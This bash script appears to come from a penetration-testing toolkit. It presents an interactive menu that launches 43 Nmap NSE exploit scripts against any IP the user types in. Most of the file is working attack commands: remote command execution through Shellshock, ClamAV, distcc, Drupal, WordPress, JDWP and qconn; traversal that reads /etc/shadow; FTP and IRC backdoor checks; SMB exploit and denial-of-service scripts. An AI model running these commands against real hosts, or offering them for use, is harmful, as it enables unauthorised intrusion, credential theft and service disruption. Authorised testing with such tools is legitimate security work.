#!/usr/bin/env bash

################################################
# EXPLOITS
################################################

# Author of changes: trimstray (contact@nslab.at, https://github.com/trimstray)
#   - removed leading and trailing whitespaces
#   - added smart tabs
#   - replaced 'test' to '[[ ]]'
#   - changed comparison operator (-eq)
#   - protection against giving an illegal value
#   - correcting indentation (transparent code)
function exploit () {
clear
  echo
  echo
  echo -e $white" [$okegreen"01"$white]$cyan afp-path-vuln "
  echo -e $white" [$okegreen"02"$white]$cyan clamav-exec   "
  echo -e $white" [$okegreen"03"$white]$cyan distcc-cve2004-2687  "
  echo -e $white" [$okegreen"04"$white]$cyan ftp-proftpd-backdoor "
  echo -e $white" [$okegreen"05"$white]$cyan ftp-vsftpd-backdoor "
  echo -e $white" [$okegreen"06"$white]$cyan http-adobe-coldfusion-apsa1301 "
  echo -e $white" [$okegreen"07"$white]$cyan http-avaya-ipoffice-users "
  echo -e $white" [$okegreen"08"$white]$cyan http-awstatstotals-exec "
  echo -e $white" [$okegreen"09"$white]$cyan http-axis2-dir-traversal "
  echo -e $white" [$okegreen"10"$white]$cyan http-barracuda-dir-traversal "
  echo -e $white" [$okegreen"11"$white]$cyan http-coldfusion-subzero "
  echo -e $white" [$okegreen"12"$white]$cyan http-csrf "
  echo -e $white" [$okegreen"13"$white]$cyan http-dlink-backdoor "
  echo -e $white" [$okegreen"14"$white]$cyan http-dombased-xss "
  echo -e $white" [$okegreen"15"$white]$cyan http-fileupload-exploiter "
  echo -e $white" [$okegreen"16"$white]$cyan http-huawei-hg5xx-vuln "
  echo -e $white" [$okegreen"17"$white]$cyan http-litespeed-sourcecode-download "
  echo -e $white" [$okegreen"18"$white]$cyan http-majordomo2-dir-traversal "
  echo -e $white" [$okegreen"19"$white]$cyan http-phpmyadmin-dir-traversal "
  echo -e $white" [$okegreen"20"$white]$cyan http-shellshock "
  echo -e $white" [$okegreen"21"$white]$cyan http-stored-xss "
  echo -e $white" [$okegreen"22"$white]$cyan http-tplink-dir-traversal "
  echo -e $white" [$okegreen"23"$white]$cyan http-vuln-cve2006-3392 "
  echo -e $white" [$okegreen"24"$white]$cyan http-vuln-cve2009-3960 "
  echo -e $white" [$okegreen"25"$white]$cyan http-vuln-cve2012-1823 "
  echo -e $white" [$okegreen"26"$white]$cyan http-vuln-cve2013-0156 "
  echo -e $white" [$okegreen"27"$white]$cyan http-vuln-cve2013-6786 "
  echo -e $white" [$okegreen"28"$white]$cyan http-vuln-cve2013-7091 "
  echo -e $white" [$okegreen"29"$white]$cyan http-vuln-cve2014-3704 "
  echo -e $white" [$okegreen"30"$white]$cyan http-vuln-cve2014-8877 "
  echo -e $white" [$okegreen"31"$white]$cyan http-vuln-wnr1000-creds "
  echo -e $white" [$okegreen"32"$white]$cyan irc-unrealircd-backdoor "
  echo -e $white" [$okegreen"33"$white]$cyan jdwp-exec "
  echo -e $white" [$okegreen"34"$white]$cyan jdwp-inject "
  echo -e $white" [$okegreen"35"$white]$cyan qconn-exec "
  echo -e $white" [$okegreen"36"$white]$cyan smb-vuln-conficker "
  echo -e $white" [$okegreen"37"$white]$cyan smb-vuln-cve2009-3103 "
  echo -e $white" [$okegreen"38"$white]$cyan smb-vuln-ms06-025 "
  echo -e $white" [$okegreen"39"$white]$cyan smb-vuln-ms07-029 "
  echo -e $white" [$okegreen"40"$white]$cyan smb-vuln-ms08-067 "
  echo -e $white" [$okegreen"41"$white]$cyan smb-vuln-regsvc-dos "
  echo -e $white" [$okegreen"42"$white]$cyan smtp-vuln-cve2010-4344 "
  echo -e $white" [$okegreen"43"$white]$cyan supermicro-ipmi-conf "
  echo -e $white" [$okegreen"44"$white]$cyan back "
  echo -e " "
  echo -n -e $red'  \033[4mScreetsec@nse-exploit:\033[0m>> '; tput sgr0 #insert your choice
           read cin
        if test $cin == '1'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=afp-path-vuln $ip &
        elif test $cin == '2'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script clamav-exec --script-args cmd='shutdown' $ip &
        elif test $cin == '3'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 3632 $ip --script distcc-exec --script-args="distcc-exec.cmd='id'" &
        elif test $cin == '4'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script ftp-proftpd-backdoor -p 21 $ip &
        elif test $cin == '5'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script ftp-vsftpd-backdoor -p 21 $ip &
        elif test $cin == '6'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ $ip &
        elif test $cin == '7'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-avaya-ipoffice-users $ip &
        elif test $cin == '8'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' $ip &
        elif test $cin == '9'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-axis2-dir-traversal $ip &
        elif test $cin == '10'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
          read port
          $xterm --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p $port $ip &
        elif test $cin == '11'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-coldfusion-subzero --script-args basepath=/cf/ $ip &
        elif test $cin == '12'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-csrf.nse $ip &
        elif test $cin == '13'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-dlink-backdoor $ip &
        elif test $cin == '14'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-dombased-xss.nse $ip &
        elif test $cin == '15'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-fileupload-exploiter.nse $ip &
        elif test $cin == '16'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-huawei-hg5xx-vuln $ip &
        elif test $cin == '17'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php $ip &
        elif test $cin == '18'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-majordomo2-dir-traversal $ip &
        elif test $cin == '19'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-phpmyadmin-dir-traversal $ip &
        elif test $cin == '20'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls $ip &
        elif test $cin == '21'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-stored-xss.nse $ip &
        elif test $cin == '22'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-tplink-dir-traversal.nse --script-args rfile=/etc/topology.conf -d -n -Pn $ip &
        elif test $cin == '23'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow $ip &
        elif test $cin == '24'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script=http-vuln-cve2009-3960 --script-args http-http-vuln-cve2009-3960.root="/root/" $ip &
        elif test $cin == '25'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-vuln-cve2012-1823 $ip &
        elif test $cin == '26'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-vuln-cve2013-0156 $ip &
        elif test $cin == '27'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV http-rompager-xss $ip &
        elif test $cin == '28'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-vuln-cve2013-7091 --script-args http-vuln-cve2013-7091=/ZimBra $ip &
        elif test $cin == '29'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" $ip &
        elif test $cin == '30'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress" $ip &
        elif test $cin == '31'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-vuln-wnr1000-creds $ip -p 80 &
        elif test $cin == '32'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=irc-unrealircd-backdoor $ip &
        elif test $cin == '33'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
          read port
          $xterm -sT $ip -p $port --script=+jdwp-exec --script-args cmd="date" &
        elif test $cin == '34'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
          read port
          $xterm -sT $ip -p $port --script=+jdwp-inject --script-args filename=HelloWorld.class &
        elif test $cin == '35'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
          read port
          $xterm --script qconn-exec --script-args qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd="uname -a" -p $port $ip &
        elif test $cin == '36'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-conficker.nse -p 445 $ip &
        elif test $cin == '37'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-cve2009-3103.nse -p 445 $ip &
        elif test $cin == '38'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-ms06-025.nse -p 445 $ip &
        elif test $cin == '39'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-ms07-029.nse -p 445 $ip &
        elif test $cin == '40'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-ms08-067.nse -p 445 $ip &
        elif test $cin == '41'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-regsvc-dos.nse -p 445 $ip &
        elif test $cin == '42'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 $ip &
        elif test $cin == '43'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p49152 --script supermicro-ipmi-conf $ip &
        elif test $cin == '44'
          then
           nse
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            menu
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            exploit
        fi
}
